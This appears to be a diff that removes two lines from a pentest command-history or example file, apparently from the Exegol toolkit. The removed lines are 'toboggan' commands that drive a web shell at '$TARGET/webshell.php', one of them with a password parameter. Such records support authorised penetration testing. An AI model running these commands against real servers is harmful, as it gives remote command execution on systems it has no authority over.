@@ -1,2 +1,0 @@
-toboggan -u 'http://$TARGET/webshell.php?cmd'
-toboggan -u 'http://$TARGET/webshell.php?cmd' -p 'password'='exegol4thewin'
